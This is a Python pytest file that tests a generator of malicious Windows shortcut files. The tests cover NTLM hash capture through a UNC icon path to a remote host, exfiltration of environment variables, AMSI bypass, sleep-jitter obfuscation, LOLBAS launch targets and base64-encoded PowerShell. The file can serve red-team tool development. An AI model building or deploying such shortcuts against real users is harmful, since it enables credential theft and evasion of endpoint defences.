"""
Tests for LNK file generation
"""

import pytest
from pathlib import Path
from generate_new import LNKGenerator


class TestLNKGenerator:
    """Test LNK file generation"""

    def test_generator_initialization(self, ntlm_payload_config):
        """Test LNKGenerator initialization"""
        generator = LNKGenerator(ntlm_payload_config)

        assert generator.config == ntlm_payload_config
        assert generator.evasion is not None
        assert generator.logger is not None

    def test_build_payload_ntlm(self, ntlm_payload_config):
        """Test payload building for NTLM capture"""
        generator = LNKGenerator(ntlm_payload_config)

        payload = generator.build_payload()

        assert isinstance(payload, str)
        assert len(payload) > 0
        # Should contain command execution
        assert "whoami" in payload

    def test_build_payload_with_amsi_bypass(self, ntlm_payload_config):
        """Test payload with AMSI bypass enabled"""
        ntlm_payload_config.evasion.anti_amsi = True
        generator = LNKGenerator(ntlm_payload_config)

        payload = generator.build_payload()

        # Should contain AMSI bypass code
        assert "try{" in payload or "amsi" in payload.lower()

    def test_build_payload_with_jitter(self, ntlm_payload_config):
        """Test payload with jitter"""
        ntlm_payload_config.evasion.jitter_min = 500
        ntlm_payload_config.evasion.jitter_max = 2000
        generator = LNKGenerator(ntlm_payload_config)

        payload = generator.build_payload()

        # Should contain sleep command (may be obfuscated with quotes)
        # Check for variations: "Sleep", "Sle''ep", "sle''ep", etc.
        assert "sle" in payload.lower() and "ep" in payload.lower()

    def test_build_payload_with_env_vars(self, env_exfil_payload_config):
        """Test payload with environment variable collection"""
        generator = LNKGenerator(env_exfil_payload_config)

        payload = generator.build_payload()

        # Should contain variable names
        assert "USERNAME" in payload
        assert "COMPUTERNAME" in payload

    def test_generate_legitimate_target_simple(self, ntlm_payload_config):
        """Test legitimate target generation without LOLBAS"""
        ntlm_payload_config.evasion.legitimate_target = False
        generator = LNKGenerator(ntlm_payload_config)

        target, arguments = generator.generate_legitimate_target()

        assert "cmd.exe" in target
        assert "powershell" in arguments.lower()
        assert "-Enc" in arguments or "-enc" in arguments

    def test_generate_legitimate_target_lolbas(self, ntlm_payload_config):
        """Test legitimate target generation with LOLBAS"""
        ntlm_payload_config.evasion.legitimate_target = True
        generator = LNKGenerator(ntlm_payload_config)

        target, arguments = generator.generate_legitimate_target()

        # Should use one of the LOLBAS binaries
        assert any(x in target for x in ["explorer.exe", "rundll32.exe", "cmd.exe"])
        assert "C:\\Windows\\System32" in target
        assert "powershell" in arguments.lower()

    @pytest.mark.skipif(
        not Path("/usr/bin/file").exists(),
        reason="file command not available"
    )
    def test_create_lnk_linux(self, ntlm_payload_config, test_output_dir):
        """Test LNK creation on Linux"""
        generator = LNKGenerator(ntlm_payload_config)
        output_path = test_output_dir / "test.lnk"

        try:
            generator.create_lnk(output_path)

            # Check file was created
            assert output_path.exists()
            assert output_path.stat().st_size > 0

            # Verify it's a LNK file
            import subprocess
            result = subprocess.run(
                ["file", str(output_path)],
                capture_output=True,
                text=True
            )
            assert "MS Windows shortcut" in result.stdout or output_path.suffix == ".lnk"

        except Exception as e:
            # pylnk3 might not be installed or compatible
            pytest.skip(f"LNK creation failed (expected on some systems): {e}")

    def test_icon_path_ntlm_capture(self, ntlm_payload_config):
        """Test icon path generation for NTLM capture"""
        generator = LNKGenerator(ntlm_payload_config)

        # Simulate icon path generation logic
        host = ntlm_payload_config.exfil_methods[0].host
        icon_path = f"\\\\{host}\\Share\\12345.ico"

        assert icon_path.startswith("\\\\")
        assert host in icon_path
        assert ".ico" in icon_path

    def test_icon_path_env_exfil(self, env_exfil_payload_config):
        """Test icon path generation for environment exfiltration"""
        from generate_new import Exfiltrator

        exfil = Exfiltrator(env_exfil_payload_config.exfil_methods[0])
        vars_path = '_'.join(f'%{v}%' for v in env_exfil_payload_config.additional_vars)
        icon_path = exfil.get_icon_path(vars_path)

        assert icon_path.startswith("\\\\")
        assert ".ico" in icon_path
        # Should contain variable placeholders or hash
        assert "%" in icon_path or any(char.isdigit() for char in icon_path)


class TestLNKGeneratorEdgeCases:
    """Test edge cases and error handling"""

    def test_multiple_commands(self, ntlm_payload_config):
        """Test payload with multiple commands"""
        ntlm_payload_config.target_command = ["whoami", "hostname", "ipconfig"]
        generator = LNKGenerator(ntlm_payload_config)

        payload = generator.build_payload()

        # All commands should be in payload
        assert "whoami" in payload
        assert "hostname" in payload
        assert "ipconfig" in payload

    def test_long_variable_list(self, env_exfil_payload_config):
        """Test payload with many environment variables"""
        env_exfil_payload_config.additional_vars = [
            "USERNAME", "COMPUTERNAME", "USERDOMAIN",
            "PROCESSOR_IDENTIFIER", "OS", "PATH",
            "TEMP", "USERPROFILE", "LOGONSERVER"
        ]
        generator = LNKGenerator(env_exfil_payload_config)

        payload = generator.build_payload()

        # Should handle many variables
        assert len(payload) > 0
        assert "USERNAME" in payload
        assert "LOGONSERVER" in payload

    def test_payload_obfuscation_produces_base64(self, ntlm_payload_config):
        """Test that final payload can be base64 encoded"""
        generator = LNKGenerator(ntlm_payload_config)

        _, arguments = generator.generate_legitimate_target()

        # Arguments should contain base64 encoded command
        assert "-Enc" in arguments or "-enc" in arguments
        # Extract base64 part
        import re
        match = re.search(r'-[Ee]nc\s+(\S+)', arguments)
        if match:
            b64_part = match.group(1)
            # Verify it's valid base64
            try:
                import base64
                base64.b64decode(b64_part)
            except Exception:
                pytest.fail("Encoded command is not valid base64")
